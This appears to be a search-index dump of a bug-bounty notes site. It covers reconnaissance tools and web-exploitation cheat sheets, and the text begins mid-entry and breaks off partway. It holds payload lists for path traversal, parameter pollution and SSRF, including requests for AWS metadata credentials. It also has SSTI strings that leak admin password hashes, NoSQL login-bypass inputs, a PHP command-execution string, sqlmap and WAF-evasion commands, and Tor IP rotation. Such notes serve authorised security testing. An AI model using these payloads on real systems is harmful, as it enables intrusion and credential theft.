\u0026ldquo;%E3%80%82\u0026rdquo; to bypass \u0026ldquo;.\u0026rdquo; blacklisted character\n//google%E3%80%82com Using null byte \u0026ldquo;%00\u0026rdquo; to bypass blacklist filter\n//google%00.com Using parameter pollution\n?next=whitelisted.com\u0026amp;next=google.com Using \u0026ldquo;@\u0026rdquo; character, browser will redirect to anything after the \u0026ldquo;@\u0026rdquo;"},{"id":40,"href":"/recon/paramdiscovery/","title":"Parameter Discovery","parent":"Recons","content":"There are two tools that I prefer when doing param scanning. X8, which is a tool made just for param discovery with advanced comparison and arjun, which does basically the same. From my tests I could not determine which one is better.\nX8 # https://github.com/Sh1Yo/x8 x8 -u \u0026#34;https://example.com/\u0026#34; -w \u0026lt;wordlist\u0026gt; Arjun # https://github.com/s0md3v/Arjun arjun -u https://target.com/ -w \u0026lt;wordlist\u0026gt; arjun -i urls.txt -oT output -m GET arjun -i urls.txt -oT output -m POST arjun -i urls.txt -oT output -m POST-JSON arjun -i urls.txt -oT output -m POST-XML Param discovering from crawling results Given a list with crawled urls, grep the ones that have known parameters and get only the url\n# https://github.com/tomnomnom/unfurl cat list.txt | grep \u0026#34;=\u0026#34; | unfurl format %d%p Feed discovered parameters back to a param list See Wordlist generation\n","description":"There are two tools that I prefer when doing param scanning. X8, which is a tool made just for param discovery with advanced comparison and arjun, which does basically the same. From my tests I could not determine which one is better.\nX8 # https://github.com/Sh1Yo/x8 x8 -u \u0026#34;https://example.com/\u0026#34; -w \u0026lt;wordlist\u0026gt; Arjun # https://github.com/s0md3v/Arjun arjun -u https://target.com/ -w \u0026lt;wordlist\u0026gt; arjun -i urls.txt -oT output -m GET arjun -i urls.txt -oT output -m POST arjun -i urls."},{"id":41,"href":"/exploitation/vulnerability/parameterpollution/","title":"Parameter Pollution","parent":"Exploitations","content":"When searching for HPP keep in mind some servers handle parameters differently.\nTake http://example.com?username=foo\u0026amp;username=bar as an example.\nPHP and Apache use the last username occurence. Tomcat uses the first occurence. ASP and IIS uses all occurences A study containing all the servers can be found here: https://owasp.org/www-pdf-archive/AppsecEU09_CarettoniDiPaola_v0.8.pdf\nSocial Media Share Links Often a websites offers its user a feature to share a given page in social media. The fearture works this way: An user clicks the share button and a pop-ip page shows the message and action button that the user click uses to share content.\nAmost always the original link from the site is reflected in the request.\nWe can use HPP to leverage this function to overwrite shared content:\nFind a page with a share feature Choose Twitter (as an example) Replace the URL from example.com/cool-article to example.com/cool-article?text=;Visit https://evil.com Load the the new URL and click the share button The user will now share a tweet with \u0026lt;original_message\u0026gt;;Visit https://evil.com Bypass WAF with HPP Sometimes a single payload will cause WAF to be triggered, one can abuse pollution to fill a payload in different parameters.\ntarget.com/file.asp?p=SOME\u0026amp;p=PAYLOAD\u0026amp;p=HERE Ideas for pollution ?id=id=1 \u0026amp;id=1?id=2 ?id[\u0026#39;\u0026amp;id=1\u0026#39;]=2 ?id[1\u0026amp;id=2]=1 ?id=1\u0026amp;id=2 \u0026amp;id=1\u0026amp;id=2 ?id=1%26id%3D2 ?id\u0026amp;id=1 ????id=1 \u0026amp;\u0026amp;\u0026amp;\u0026amp;id=1 ?id=id[\u0026#39;1\u0026#39;]=2 ?id=1#id=2 ?id==1 ?id===1 ;id=1?id=2 ?id;id=1 \u0026amp;id=1;id=2 #id=1?id=2\u0026amp;id=3 ?id=1,2 ?id1,id2=1 ?id[=1\u0026amp;id=2]=3 ?id[\u0026amp;id=2]=1 ?id=[1,2] ?id\u0026amp;=1 ?id[]=1\u0026amp;id=2 ?id=/:@\u0026amp;=+$\u0026amp;id=2 ?id[=/:@\u0026amp;=+$\u0026amp;id=2]=1 ?id={id:{id:1},2} ?id[{id:{id[]:1},2}]=3 ?id=%23?id=1 ?id=1%26id=2 ?id=1%2526id=2 ?id=1%c0%a6id=2 ?id=1\\uc0a6id=2 ?id=1\u0026amp;amp;id=2 ?id=1\u0026amp;#38;id=2 ?id=1%u0026;id=2 ","description":"When searching for HPP keep in mind some servers handle parameters differently.\nTake http://example.com?username=foo\u0026amp;username=bar as an example.\nPHP and Apache use the last username occurence. Tomcat uses the first occurence. ASP and IIS uses all occurences A study containing all the servers can be found here: https://owasp.org/www-pdf-archive/AppsecEU09_CarettoniDiPaola_v0.8.pdf\nSocial Media Share Links Often a websites offers its user a feature to share a given page in social media. The fearture works this way: An user clicks the share button and a pop-ip page shows the message and action button that the user click uses to share content."},{"id":42,"href":"/exploitation/vulnerability/pathtransversal/","title":"Path Transversal","parent":"Exploitations","content":" Char Encoded space %20 / %2f \\ %5c % %25 . %2e f %66 e %65 Tricks %252%66 -\u0026gt; %2f -\u0026gt; / %252%65 -\u0026gt; %2e -\u0026gt; . %252f -\u0026gt; %2f -\u0026gt; / %252e -\u0026gt; %2e -\u0026gt; . Payloads ..;/ ..%5c ..%2f ../ ..\\ ..;\\ ..%252f %2e%2e%252f %252%66.%252%65 / // /// //// ///// ////// /////// //////// ///////// ////////// Files env\netc/passwd\nWindows/win.ini\nResources URL https://github.com/GrrrDog/weird_proxies ","description":" Char Encoded space %20 / %2f \\ %5c % %25 . %2e f %66 e %65 Tricks %252%66 -\u0026gt; %2f -\u0026gt; / %252%65 -\u0026gt; %2e -\u0026gt; . %252f -\u0026gt; %2f -\u0026gt; / %252e -\u0026gt; %2e -\u0026gt; . Payloads ..;/ ..%5c ..%2f ../ ..\\ ..;\\ ..%252f %2e%2e%252f %252%66.%252%65 / // /// //// ///// ////// /////// //////// ///////// ////////// Files env\netc/passwd\nWindows/win.ini\nResources URL https://github.com/GrrrDog/weird_proxies "},{"id":43,"href":"/recon/portscan/","title":"Port Scan","parent":"Recons","content":" Nmap # https://github.com/nmap/nmap ./configure make make install nmap -sC -sV example.com nmap example.com https://3os.org/penetration-testing/cheatsheets/nmap-cheatsheet/\nNaabu # https://github.com/projectdiscovery/naabu naabu -p 80,443,21-23 -host example.com cat list | naabu -top-ports 100 -ep 80,443,8080,8443 ","description":" Nmap # https://github.com/nmap/nmap ./configure make make install nmap -sC -sV example.com nmap example.com https://3os.org/penetration-testing/cheatsheets/nmap-cheatsheet/\nNaabu # https://github.com/projectdiscovery/naabu naabu -p 80,443,21-23 -host example.com cat list | naabu -top-ports 100 -ep 80,443,8080,8443 "},{"id":44,"href":"/recon/probing/","title":"Probing","parent":"Recons","content":"Validates a list of urls, checks to see if they are alive or not.\nhttpX # https://github.com/projectdiscovery/httpx # go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest cat urls | httpx -random-agent -retries 2 -o out Hold down!\nFor some reason httpx fails to retrieve all good working urls. It is recommended to run httpx more than once to achieve better results.\n","description":"Validates a list of urls, checks to see if they are alive or not.\nhttpX # https://github.com/projectdiscovery/httpx # go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest cat urls | httpx -random-agent -retries 2 -o out Hold down!\nFor some reason httpx fails to retrieve all good working urls. It is recommended to run httpx more than once to achieve better results."},{"id":45,"href":"/exploitation/vulnerability/prototypepollution/","title":"Prototype Pollution","parent":"Exploitations","content":" https://github.com/BlackFan/client-side-prototype-pollution https://github.com/msrkp/PPScan Where to find? Javascript driven frameworks (Express..) PHP PHP internally uses parse_str() to parse parameters so it sees the char \u0026ldquo;[\u0026rdquo; \u0026amp; \u0026ldquo;_\u0026rdquo; as the same. PHP by default will use the last param as valid. In cases PHP is running on backend but front end validates the param, we can smuggle fake params to php\nexample.com?account_id=gust\u0026amp;account[id=admin # Backend would execute guest and frontend admin Talks https://www.youtube.com/watch?v=LUsiFV3dsK8\n","description":"https://github.com/BlackFan/client-side-prototype-pollution https://github.com/msrkp/PPScan Where to find? Javascript driven frameworks (Express..) PHP PHP internally uses parse_str() to parse parameters so it sees the char \u0026ldquo;[\u0026rdquo; \u0026amp; \u0026ldquo;_\u0026rdquo; as the same. PHP by default will use the last param as valid. In cases PHP is running on backend but front end validates the param, we can smuggle fake params to php\nexample.com?account_id=gust\u0026amp;account[id=admin # Backend would execute guest and frontend admin Talks https://www.youtube.com/watch?v=LUsiFV3dsK8"},{"id":46,"href":"/recon/","title":"Recon","parent":"Welcome to caon.io","content":"Everything about recon!\n","description":"Everything about recon!"},{"id":47,"href":"/recon/","title":"Recons","parent":"Welcome to caon.io","content":"","description":""},{"id":48,"href":"/resources/regexes/","title":"Regexes","parent":"Resources","content":" Site About https://www.autoregex.xyz/ Generate based on text https://github.com/mazen160/secrets-patterns-db Database of regexes secrets ","description":" Site About https://www.autoregex.xyz/ Generate based on text https://github.com/mazen160/secrets-patterns-db Database of regexes secrets "},{"id":49,"href":"/exploitation/vulnerability/rce/","title":"Remote Code Execution","parent":"Exploitations","content":" How to achieve RCE in known CMSes, frameworks and related https://github.com/p0dalirius/Awesome-RCE-techniques PHP ${@print(system(\u0026quot;whoami\u0026quot;))} ","description":" How to achieve RCE in known CMSes, frameworks and related https://github.com/p0dalirius/Awesome-RCE-techniques PHP ${@print(system(\u0026quot;whoami\u0026quot;))} "},{"id":50,"href":"/resources/repositories/","title":"Repositories","parent":"Resources","content":" Repository Description https://github.com/Lissy93/personal-security-checklist#authentication Security Checklist from explanatory side https://github.com/Bandit-HaxUnit/haxunit Workflow for recon https://github.com/edoardottt/awesome-hacker-search-engines Awesome search engines ","description":" Repository Description https://github.com/Lissy93/personal-security-checklist#authentication Security Checklist from explanatory side https://github.com/Bandit-HaxUnit/haxunit Workflow for recon https://github.com/edoardottt/awesome-hacker-search-engines Awesome search engines "},{"id":51,"href":"/exploitation/vulnerability/requestsmuggling/","title":"Request Smuggling","parent":"Exploitations","content":"It\u0026rsquo;s far more easier to search for articles explaining this concept.\nTools HTTP Request Smuggler, Burp extension # https://github.com/defparam/smuggler python3 smuggler.py -u \u0026lt;URL\u0026gt; Articles https://portswigger.net/web-security/request-smuggling https://cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling https://paper.seebug.org/1049/ https://blog.zeddyu.info/2019/12/08/HTTP-Smuggling-en/ Exploitation Bring impact by reporting smuggling chained with host injection. Users should make simple request with your injected header. ","description":"It\u0026rsquo;s far more easier to search for articles explaining this concept.\nTools HTTP Request Smuggler, Burp extension # https://github.com/defparam/smuggler python3 smuggler.py -u \u0026lt;URL\u0026gt; Articles https://portswigger.net/web-security/request-smuggling https://cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling https://paper.seebug.org/1049/ https://blog.zeddyu.info/2019/12/08/HTTP-Smuggling-en/ Exploitation Bring impact by reporting smuggling chained with host injection. Users should make simple request with your injected header. "},{"id":52,"href":"/resources/","title":"Resources","parent":"Welcome to caon.io","content":"","description":""},{"id":53,"href":"/resources/","title":"Resources","parent":"Welcome to caon.io","content":"Cool stuff\n","description":"Cool stuff"},{"id":54,"href":"/exploitation/auth/saml/","title":"SAML","parent":"Exploitations","content":" https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf https://docs.google.com/presentation/d/1ngp3Mq8y2h2xwGKqkOhI1ePUQxvXTNO1Xhs1kaBJmqU/edit ","description":" https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf https://docs.google.com/presentation/d/1ngp3Mq8y2h2xwGKqkOhI1ePUQxvXTNO1Xhs1kaBJmqU/edit "},{"id":55,"href":"/recon/scope/","title":"Scope","parent":"Recons","content":"A scope can be defined as of the limit of where your research should go, if you ever find a bug, this must reside inside the scope, otherwise, the finding is not valid.\nExample of scope\nIn-Scope Out of scope example.com subdomain.example.com *-dev.example.com The scope above states that example.com and www.example.com are valid (www is a subdomain, example.com points to www by default).\nAny subdomain under -dev.example.com is valid as well, the wildcard symbol (*) states that anything is valid. So, test-dev.example.com, app-dev.example.com are valid but app.example.com is not because the subdomain does not have the -devpart.\nSome programs offer a wildcard scope, in those cases, it is a good idea to keep an eye in Out of scope domains. See the example:\nIn-Scope Out of scope *.website.com wow.website.com ie.website.com As written, website.com has a wildcard scope, meaning every subdomain is valid, except for those who are in the Out of scope list, which are wow.website.com and ie.website.com\n","description":"A scope can be defined as of the limit of where your research should go, if you ever find a bug, this must reside inside the scope, otherwise, the finding is not valid.\nExample of scope\nIn-Scope Out of scope example.com subdomain.example.com *-dev.example.com The scope above states that example.com and www.example.com are valid (www is a subdomain, example.com points to www by default).\nAny subdomain under -dev.example.com is valid as well, the wildcard symbol (*) states that anything is valid."},{"id":56,"href":"/recon/screenshot/","title":"Screenshot","parent":"Recons","content":"For large recons where manual website visit is not doable. The program would grab a list of valid urls and screenshot them using a headless browser.\nHold down!\nA browser must be installed prior using an screenshotter. Chrome or chromium is recommended.\nGoWitnessß # https://github.com/sensepost/gowitness gowitness file -f websites.txt -t \u0026lt;threads\u0026gt; ","description":"For large recons where manual website visit is not doable. The program would grab a list of valid urls and screenshot them using a headless browser.\nHold down!\nA browser must be installed prior using an screenshotter. Chrome or chromium is recommended.\nGoWitnessß # https://github.com/sensepost/gowitness gowitness file -f websites.txt -t \u0026lt;threads\u0026gt; "},{"id":57,"href":"/resources/sites/","title":"Sites","parent":"Resources","content":" Link Niche https://www.hahwul.com/ Blog https://netsec.expert/ Blog https://ihorrasch.com/ Blog https://www.agarri.fr/en Blog https://www.100security.com.br/ Blog (portuguese) https://www.hacking8.com/ Blog (chinese) https://www.rcesecurity.com Blog https://weboas.is/ Link aggregator https://portswigger.net/research Burp\u0026rsquo;s owner research blog https://blog.orange.tw/ Blog/Research https://swarm.ptsecurity.com/ PT Swarm research blog https://0xdf.gitlab.io/ Solving HTB machines https://sploitus.com/ Search engine to find exploits https://www.exploitalert.com/ Search engine to find exploits https://unsafe.sh Chinese forum https://secret.club/ About HW and low level hacking https://www.bugbountyhunting.com/ Bug Bounty Writeups https://y4er.com/posts/ Chinese security posts https://anchisesbr.blogspot.com/ Portuguese security posts ","description":" Link Niche https://www.hahwul.com/ Blog https://netsec.expert/ Blog https://ihorrasch.com/ Blog https://www.agarri.fr/en Blog https://www.100security.com.br/ Blog (portuguese) https://www.hacking8.com/ Blog (chinese) https://www.rcesecurity.com Blog https://weboas.is/ Link aggregator https://portswigger.net/research Burp\u0026rsquo;s owner research blog https://blog.orange.tw/ Blog/Research https://swarm.ptsecurity.com/ PT Swarm research blog https://0xdf.gitlab.io/ Solving HTB machines https://sploitus.com/ Search engine to find exploits https://www.exploitalert.com/ Search engine to find exploits https://unsafe.sh Chinese forum https://secret.club/ About HW and low level hacking https://www.bugbountyhunting.com/ Bug Bounty Writeups https://y4er.com/posts/ Chinese security posts https://anchisesbr.blogspot.com/ Portuguese security posts "},{"id":58,"href":"/exploitation/vulnerability/other/smsverification/","title":"SMS Verification","parent":"Exploitations","content":" Online https://receive-smss.com/ eSim https://www.airalo.com/ ","description":" Online https://receive-smss.com/ eSim https://www.airalo.com/ "},{"id":59,"href":"/exploitation/vulnerability/sqli/","title":"SQLi","parent":"Exploitations","content":" sqlmap https://github.com/sqlmapproject/sqlmap # request in txt sqlmap -r search-test.txt -p parameter # post sqlmap -o -u \u0026#34;http://example.com/index.php?id=1\u0026#34; --data=\u0026#34;username=admin\u0026amp;password=pass\u0026amp;submit=+Login+\u0026#34; --method=POST # get sqlmap -u \u0026#34;http://example.com/index.php?id=1\u0026#34; # with point of injection (*) sqlmap -u \u0026#34;http://example.com/index.php?id=1*-133\u0026amp;debug=true\u0026#34; # risk sqlmap -u \u0026#34;http://example.com/index.php?id=1\u0026#34; --risk=3 --level=5 # headers sqlmap --headers=\u0026#34;HEADER\u0026#34; Temper The ability to create payloads that can bypass waf\nhttps://github.com/m4ll0k/Atlas Example:\n--tamper=\u0026#34;between,randomcase\u0026#34; Tricks Sometimes sites append an extra (\u0026rsquo;) character in injection. It is possible to bypass this behavior by abusing UTF-8. \\xc2 asks for a follow up byte, the decoding of \\xc2\u0026rsquo; (\\xc2\\x27) would result in a bypass.\nSleep randomtext%\u0026#39; OR SLEEP (5) # Articles URL https://www.binarytides.com/sqlmap-hacking-tutorial/ https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html ","description":"sqlmap https://github.com/sqlmapproject/sqlmap # request in txt sqlmap -r search-test.txt -p parameter # post sqlmap -o -u \u0026#34;http://example.com/index.php?id=1\u0026#34; --data=\u0026#34;username=admin\u0026amp;password=pass\u0026amp;submit=+Login+\u0026#34; --method=POST # get sqlmap -u \u0026#34;http://example.com/index.php?id=1\u0026#34; # with point of injection (*) sqlmap -u \u0026#34;http://example.com/index.php?id=1*-133\u0026amp;debug=true\u0026#34; # risk sqlmap -u \u0026#34;http://example.com/index.php?id=1\u0026#34; --risk=3 --level=5 # headers sqlmap --headers=\u0026#34;HEADER\u0026#34; Temper The ability to create payloads that can bypass waf\nhttps://github.com/m4ll0k/Atlas Example:\n--tamper=\u0026#34;between,randomcase\u0026#34; Tricks Sometimes sites append an extra (\u0026rsquo;) character in injection. It is possible to bypass this behavior by abusing UTF-8."},{"id":60,"href":"/exploitation/vulnerability/ssrf/","title":"SSRF","parent":"Exploitations","content":"Sometimes sites offer the possibility to make external requests using their server, what if we could user their “external” service to make requests for internal resources. That’s SSRF.\nIf the site is hosted in amazon, it is possible to get internal information by requesting the urls:\nhttp://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/user-data/ http://169.254.169.254/latest/meta-data/iam/security-credentials/flaws/ http://169.254.169.254/latest/meta-data/hostname http://169.254.169.254/latest/meta-data/iam/securty-credentials Another idea is to try and request IP’s that we know that are internal:\n10.0.0.0 to 10.255.255.55 100.64.0.0 to 10.127.255.255 127.0.0.0 to 127.255.255.255 127.16.0.0 to 127.31.255.255 192.0.0.0 to 192.0.0.255 198.18.0.0 to 198.19.255.255 Sometimes websites block external acess to localhost (ie 127.0.0.1). Fortunately it is possible to bypass restrictions by referencing localhost in other ways.\nDid you know that 127.0.0.1 and 127.1 are the same thing?\n127.0.0.1 127.0.0.2 127.1 127.2 ::1 0:0:0:0:0:0:0:1 0:0:0:000:0:0:0:1 0000:0000:0000:0000:0000:0000:0000:0001 2130706433 2130706434 7F000001 7F000002 localhos 127.123.123.123 0x7f.1 017700000001 127.0.0.1 localhost 0x7f.0x0.0x0.0x1 0177.00.00.01 017700000001 0x7f001 2130706433 017700000001 %6c%6f%63%61%6c%68%6f%73%74 %31%32%37%2e%30%2e%30%2e%31 0x7f000001 00000000177.000000000.000000000.000000001 0x7f.0x0.0x0.0x1 0x000000007f.0x000000000.0x000000000.0x000000001 0x7f.0x0.0x0.1 0x7f.0x0.0.1 0x7f.0.0.1 127.0x0.0x0.0x1 127.0.0x0.0x1 127.0.0.0x1 0177.00.00.1 0177.00.0.1 0177.0.0.1 127.00.00.01 127.0.00.01 127.0.0.01 0x7f.0x0.1 0x7f.1 0177.00.1 0177.1 0x7f.00.1 0177.0x0.1 ::ffff:7f000001 0:0:0:0:0:ffff:7f000001 0000:0000:0000:0000:0000:ffff:7f000001 0000:0000:0000:0000:0000:ffff:127.0.0.1 hostname 0177.1 0177.2 0177.0.1 0177.0.2 017700000001 017700000002 0x7F000001 0x7F000002 0X07f.0.0.1 IP Converter https://h.43z.one/ipconverter/ Redirect from one URL to another https://ssrf.localdomain.pw https://ssrf.localdomain.pw/csv-with-body/301-http-169.254.169.254:80-.c.csv https://ssrf.localdomain.pw/img-with-body/301-http-169.254.169.254:80-.i.jpg https://sslip.io/ DNS Rebinding To put it super simply, DNS rebinding allows you to have a hostname that switches between 2 ips with a very low ttl. This can bypass SSRF protections by resolving as a “safe” ip at first, then immediately switching to an “unsafe” or internal ip.\nhttps://lock.cmpxchg8b.com/rebinder.html Using enclosed alphanumerics http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com Convert to unicode: http://qaz.wtf/u/convert.cgi\nCloud Meadata Interactsh server supports DNS records for cloud metadata services, which is useful for testing SSRF-related vulnerabilities.\naws.interact.sh points to 169.254.169.254 alibaba.interact.sh points to 100.100.100.200 PDF # https://github.com/jonaslejon/malicious-pdf python3 malicious-pdf.py burp-collaborator-url Mindmap Articles WriteUp Description https://dant0x65.medium.com/bug-bounty-tip-automating-ssrf-ea344ec59962 Configure burp to look for SSRFs https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery All about SSRF https://github.com/jdonsec/AllThingsSSRF All Things SSRF https://github.com/assetnote/blind-ssrf-chains Blind SSRF Chains ","description":"Sometimes sites offer the possibility to make external requests using their server, what if we could user their “external” service to make requests for internal resources. That’s SSRF.\nIf the site is hosted in amazon, it is possible to get internal information by requesting the urls:\nhttp://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/user-data/ http://169.254.169.254/latest/meta-data/iam/security-credentials/flaws/ http://169.254.169.254/latest/meta-data/hostname http://169.254.169.254/latest/meta-data/iam/securty-credentials Another idea is to try and request IP’s that we know that are internal:\n10.0.0.0 to 10.255.255.55 100.64.0.0 to 10."},{"id":61,"href":"/exploitation/vulnerability/ssti/","title":"SSTI","parent":"Exploitations","content":" Tools # https://github.com/epinna/tplmap tplmap.py -u \u0026#39;http://www.target.com/page?name=John\u0026#39; Python Django/Flask Detection:\n{% if \u0026#39;str\u0026#39; = \u0026#39;str\u0026#39; %} vuln {% endif %} {% debug %} Disclose pages:\n{% include \u0026#39;admin/base.html\u0026#39; %} Disclose log table:\n{% load log %}{% get_admin_log 10 as log %}{% for e in log %} {{e.user.get_username}} : {{e.user.password}}{% endfor %} ASP/APS.NET/ASPX % is a key character If \u0026lt;% returns 500, try \u0026lt;%= 7*7 %\u0026gt; Tips Try to SSTI with the fuzz string provided in cobalt.io blog post refered below\nURL Description https://github.com/DiogoMRSilva/websitesVulnerableToSSTI Engines vulnerable to SSTI https://github.com/payloadbox/ssti-payloads Payloads https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti Blog about SSTI ","description":"Tools # https://github.com/epinna/tplmap tplmap.py -u \u0026#39;http://www.target.com/page?name=John\u0026#39; Python Django/Flask Detection:\n{% if \u0026#39;str\u0026#39; = \u0026#39;str\u0026#39; %} vuln {% endif %} {% debug %} Disclose pages:\n{% include \u0026#39;admin/base.html\u0026#39; %} Disclose log table:\n{% load log %}{% get_admin_log 10 as log %}{% for e in log %} {{e.user.get_username}} : {{e.user.password}}{% endfor %} ASP/APS.NET/ASPX % is a key character If \u0026lt;% returns 500, try \u0026lt;%= 7*7 %\u0026gt; Tips Try to SSTI with the fuzz string provided in cobalt."},{"id":62,"href":"/tags/","title":"Tags","parent":"Welcome to caon.io","content":"","description":""},{"id":63,"href":"/recon/thirdparty/","title":"Third Party","parent":"Recons","content":" Waybackmachine \u0026amp; others Use gau to search for old files and paths from crawl websites\necho \u0026#34;example.com\u0026#34; | gau Alienvault Look under Associated Urls\nhttps://otx.alienvault.com/indicator/domain/example.com\nAWS Scraping By visiting IP\u0026rsquo;s under AWS control and looking for certificates it is possible to find content owned by a company.\nhttps://github.com/jhaddix/awsScrape/\nMore https://leakix.net/\n","description":"Waybackmachine \u0026amp; others Use gau to search for old files and paths from crawl websites\necho \u0026#34;example.com\u0026#34; | gau Alienvault Look under Associated Urls\nhttps://otx.alienvault.com/indicator/domain/example.com\nAWS Scraping By visiting IP\u0026rsquo;s under AWS control and looking for certificates it is possible to find content owned by a company.\nhttps://github.com/jhaddix/awsScrape/\nMore https://leakix.net/"},{"id":64,"href":"/exploitation/vulnerability/other/uuid/","title":"UUID","parent":"Exploitations","content":" V1 V1 UUIDs are not that unique, UUIDv1 contains sequences that can be guessed.\nSince the first chunks are timestamps, one can bruteforce possibilities in between two known values, guessing the right one.\nhttps://github.com/felipecaon/uuidv1gen\nhttps://www.uuidtools.com/decode\n","description":"V1 V1 UUIDs are not that unique, UUIDv1 contains sequences that can be guessed.\nSince the first chunks are timestamps, one can bruteforce possibilities in between two known values, guessing the right one.\nhttps://github.com/felipecaon/uuidv1gen\nhttps://www.uuidtools.com/decode"},{"id":65,"href":"/exploitation/bypass/waf/","title":"WAF Bypass Techniques","parent":"Exploitations","content":" Try to find real IP address instead of TLD domain, see IP history websites section\nAwesome WAF\nHow to bypass wafs\n# https://github.com/vincentcox/bypass-firewalls-by-DNS-history bash bypass-firewalls-by-DNS-history.sh -d example.com # Tool to fuzz urls for waf bypasses # https://github.com/RedSection/pFuzz # A lot of options, see docs IP history websites https://whoisrequest.com/history/ https://viewdns.info/iphistory/ https://blog.nem.ec/2020/01/22/discover-cloudflare-wordpress-ip https://securitytrails.com/domain/example.com/dns https://www.secjuice.com/finding-real-ips-of-origin-servers-behind-cloudflare-or-tor/ Quick Techniques Given domain.com, try to subdomains that reflect the main application but are not protected:\ndev.domain.com stage.domains.com www1/ww1/www2/www3/\u0026hellip;domain.com domain.com/en By WAF type Akamai: Send header: Pragma: akamai-x-get-true-cache-key Cloudflare Try to change Host headers 3 Tricks to bypass ModSecurity https://blog.h3xstream.com/2021/10/bypassing-modsecurity-waf.html Proxychains Rotate IP every 10 seconds to bypass WAFs\n# install sudo apt-get install proxychains sudo apt-get install tor # then update the files /etc/proxychains.conf and /etc/tor/torrc with the given config # restart tor server sudo service restart tor # prefix the tool (any command) with proxychains example while true; do proxychains curl ifconfig.me; done toorc MaxCircuitDirtiness 1 CircuitBuildTimeout 10 LearnCircuitBuildTimeout 0 proxychains.conf dynamic_chain quiet_mode proxy_dns tcp_read_time_out 15000 tcp_connect_time_out 8000 [ProxyList] socks5 127.0.0.1 9050 ","description":"Try to find real IP address instead of TLD domain, see IP history websites section\nAwesome WAF\nHow to bypass wafs\n# https://github.com/vincentcox/bypass-firewalls-by-DNS-history bash bypass-firewalls-by-DNS-history.sh -d example.com # Tool to fuzz urls for waf bypasses # https://github.com/RedSection/pFuzz # A lot of options, see docs IP history websites https://whoisrequest.com/history/ https://viewdns.info/iphistory/ https://blog.nem.ec/2020/01/22/discover-cloudflare-wordpress-ip https://securitytrails.com/domain/example.com/dns https://www.secjuice.com/finding-real-ips-of-origin-servers-behind-cloudflare-or-tor/ Quick Techniques Given domain.com, try to subdomains that reflect the main application but are not protected:\ndev.domain.com stage."},{"id":66,"href":"/exploitation/vulnerability/other/webtech/","title":"Web Technologies","parent":"Exploitations","content":" Adobe AEM aem-hacker aemscan aem-paths.txt writeup about aem exploitation Adobe Coldfusion https://www.jomar.fr/posts/2021/basic_recon_to_rce/ API API-Security-Checklist api-testing-checklist API Security 31-days-of-API-Security-Tips awesome-api-security web-api-pentesting OpenAPI Scanner General tips Mindmap Apache Exploit default apache Apache Struts2 Endpoints with .action, .do, .go are all using struts2 Content-Type: %{#context[\u0026#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse\u0026#39;].addHeader(\u0026#39;Added Header\u0026#39;,4*4)}.multipart/form-data Artifactory Hacking Artifactory Hacking guide ASP.NET/IIS ASPX and ASP.net have viewstate in cookie values, default ASP has not exploiting-viewstate viewgen shortname scanner XSS trace.axd any.aspx/trace.axd WEB-INF/web.xml con/ aux/ con.aspx aux.aspx Cloudflare Techniques to try to uncover web servers behind cloudflare:\nSearch domain in https://leaked.site/index.php?resolver%2Fcloudflare.0%2F= CloudFlair Historical DNS records, IP records, see WAF Bypass Cockpit CMS https://swarm.ptsecurity.com/rce-cockpit-cms/ Django Try to POST in /admin, data will maybe leak (SQLi in ?date)[https://github.com/vulhub/vulhub/tree/master/django/CVE-2022-34265] Flask Flask-Unsign GraphQL GraphQL introspection Voyager clairvoyance - bruteforce introspection HackTricks - GraphQL Fingerprint Explore Introspection Intercom Interact with an email, log off, then run the command below with the same email. You will be able to see \u0026ldquo;Conversation history\u0026rdquo; if \u0026ldquo;Enforce Identity Validation\u0026rdquo; is not properly setup.\nIntercom(\u0026#39;boot\u0026#39;, { email: \u0026#39;\u0026lt;MY_EMAIL_ADDRESS\u0026gt;\u0026#39; }); http://dday.us/2021/11/03/h1vendorATO.html Java RMI https://github.com/NickstaDB/BaRMIe Jetty RCE by hotdeploy is enabled by default\nhttps://pbs.twimg.com/media/FZUf9KOXwAALOsw?format=jpg\u0026name=large https://swarm.ptsecurity.com/jetty-features-for-hacking-web-apps/ JBoss jexboss Jenkins https://github.com/gquere/pwn_jenkins JENKINSIP/PROJECT//securityRealm/user/admin JENKINSIP/jenkins/script Jira Check, unauth users should not have privileges /rest/api/2/mypermissions /rest/api/3/mypermissions jirascan jiraffe JSON Web Tokens jwt-pwn jwt_tool Hashcat to brute\u0026rsquo;em all! Mode 16500 Meteor https://www.offsec.com/offsec/wekan-authentication-bypass/ Mongo (Mongo IDs can lead to IDOR)[https://www.mickaelwalter.fr/idor-with-mongodb-understanding-objectid/]\nusername[$ne]=toto\u0026amp;password[$ne]=toto {\u0026#34;username\u0026#34;: {\u0026#34;$ne\u0026#34;: null}, \u0026#34;password\u0026#34;: {\u0026#34;$ne\u0026#34;: null}} {\u0026#34;username\u0026#34;: {\u0026#34;$gt\u0026#34;:\u0026#34;\u0026#34;}, \u0026#34;password\u0026#34;: {\u0026#34;$gt\u0026#34;:\u0026#34;\u0026#34;} Next.JS Look for _buildManifest.js in source coode, it exposes routes inside sortedPages.\nNode/Express If the target is responding with X-Powered-By: Express and there is HTML in responses, it’s highly likely that NodeJs with server-side templating is being used Add layout in your wordlist of parameter discovery/fuzzing for GET query or POST body. If the arbitrary value of layout parameter added is resulting in 500 Internal Server Error with ENOENT: no such file or directory in body, You have hit the LFR. https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/\nPentaho https://research.aurainfosec.io/pentest/pentah0wnage/ Salesforce Exploitation https://github.com/reconstation/sret https://github.com/Ph33rr/cirrusgo SAP SAP_RECON SAP-wordlist mySapAdventures ServiceNow kb_view_customer.do?sysparm_article=KB00XXXXX, unauth endpoint sometimes return data Sharepoint https://medium.com/@ujmalhotra95/tales-of-sharepoint-api-misconfigurations-11073ad384fd Spring 